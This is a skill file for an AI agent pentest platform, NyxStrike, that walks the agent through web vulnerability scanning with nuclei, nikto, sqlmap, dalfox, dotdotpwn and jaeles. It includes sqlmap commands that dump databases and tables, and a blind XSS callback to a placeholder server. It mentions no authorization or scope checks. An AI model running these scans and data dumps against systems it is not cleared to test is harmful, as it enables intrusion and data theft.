---
name: web-vuln
description: Web vulnerability scanning workflow covering SQLi, XSS, template injection, and generic CVE detection using nuclei, sqlmap, dalfox, nikto, and jaeles
---

# web-vuln

Web vulnerability scanning workflow for NyxStrike. Use this skill when a user wants to find SQL injection, XSS, SSRF, misconfigurations, or run a broad CVE scan against a web target.

## Workflow

### 1. Broad CVE and misconfiguration scan (nuclei)

Start with nuclei — it covers the widest range of vulnerabilities with minimal noise.

```
run_tool(tool="nuclei", target="https://<target>")
```

Narrow by severity or tag when you want focused results:

```
# Critical and high only
run_tool(tool="nuclei", target="https://<target>", severity="critical,high")

# Technology-specific
run_tool(tool="nuclei", target="https://<target>", tags="wordpress,apache,nginx,php")

# Exposure checks only
run_tool(tool="nuclei", target="https://<target>", tags="exposure,misconfig")
```

### 2. General web server scan (nikto)

Run nikto in parallel with or after nuclei for server-level issues (headers, default files, SSL):

```
run_tool(tool="nikto", target="https://<target>")
```

### 3. SQL injection (sqlmap)

Target a specific URL with parameters. Supply POST data when needed.

```
# GET parameter
run_tool(tool="sqlmap", url="https://<target>/page?id=1",
         additional_args="--batch --level=3 --risk=2")

# POST request
run_tool(tool="sqlmap", url="https://<target>/login",
         data="username=admin&password=test",
         additional_args="--batch --dbs")
```

Escalate once injection is confirmed:

```
# Dump database list
run_tool(tool="sqlmap", url="...", additional_args="--batch --dbs")

# Dump a specific table
run_tool(tool="sqlmap", url="...", additional_args="--batch -D <db> -T <table> --dump")
```

### 4. XSS scanning (dalfox)

Run dalfox against endpoints that reflect user input:

```
run_tool(tool="dalfox", url="https://<target>/search?q=test")

# With blind XSS callback
run_tool(tool="dalfox", url="https://<target>/search?q=test",
         blind=true,
         additional_args="--blind https://<your-callback-server>")
```

### 5. Directory traversal (dotdotpwn)

Use when the app appears to serve files or has path parameters:

```
run_tool(tool="dotdotpwn", target="<target>",
         additional_args="-m http -o unix")
```

### 6. Framework scan (jaeles)

Jaeles covers complex multi-step vulnerability chains:

```
run_tool(tool="jaeles", url="https://<target>")
```

## Prioritisation guide

| Finding from recon | Next tool |
|---|---|
| Login form | sqlmap (POST), dalfox |
| Search / reflect input | dalfox, xsser |
| File download param | dotdotpwn |
| WordPress | nuclei tags=wordpress |
| Generic CVE sweep | nuclei severity=critical,high |
| Old server version | nikto, nuclei |

## Tips

- Always run nuclei first — it gives the broadest signal for the least effort.
- Feed URLs discovered by `katana` or `gau` (from `web-recon` skill) into sqlmap and dalfox for wider attack surface.
- Use `--batch` with sqlmap to avoid interactive prompts in automated runs.
- Combine nuclei tag filters: `tags="cve,rce,lfi"` for high-impact checks only.

## NyxStrike Tool Reference

| Tool | Use case |
|---|---|
| `nuclei` | Template-based CVE/misconfiguration scanner |
| `nikto` | Web server issue scanner |
| `sqlmap` | SQL injection detection and exploitation |
| `dalfox` | XSS scanner with blind support |
| `xsser` | Alternative XSS scanner |
| `dotdotpwn` | Directory traversal scanner |
| `jaeles` | Multi-step web vulnerability framework |
